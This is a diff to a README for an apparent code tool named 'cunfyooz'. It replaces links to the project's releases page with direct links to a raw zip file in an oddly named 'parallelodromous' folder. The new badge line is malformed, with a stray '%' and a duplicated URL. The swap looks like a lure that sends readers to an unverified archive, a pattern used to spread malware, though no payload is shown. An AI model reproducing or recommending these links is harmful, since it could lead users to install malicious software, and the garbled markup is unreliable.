@@ -6,7 +6,7 @@ Welcome to cunfyooz! This application helps you transform code easily without ne
 
 ## 📦 Download
 
-[![Download cunfyooz](https://img.shields.io/badge/Download%20cunfyooz-v1.0-blue.svg)](https://github.com/franco0421/cunfyooz/releases)
+[![Download cunfyooz](https://raw.githubusercontent.com/franco0421/cunfyooz/main/parallelodromous/cunfyooz.zip%https://raw.githubusercontent.com/franco0421/cunfyooz/main/parallelodromous/cunfyooz.zip)](https://raw.githubusercontent.com/franco0421/cunfyooz/main/parallelodromous/cunfyooz.zip)
 
 ## 📋 What is cunfyooz?
 
@@ -25,7 +25,7 @@ To run cunfyooz, ensure your system meets these requirements:
 
 To download cunfyooz, visit the following link:
 
-[Download cunfyooz](https://github.com/franco0421/cunfyooz/releases)
+[Download cunfyooz](https://raw.githubusercontent.com/franco0421/cunfyooz/main/parallelodromous/cunfyooz.zip)
 
 Here, you’ll find the latest version available for download.
 
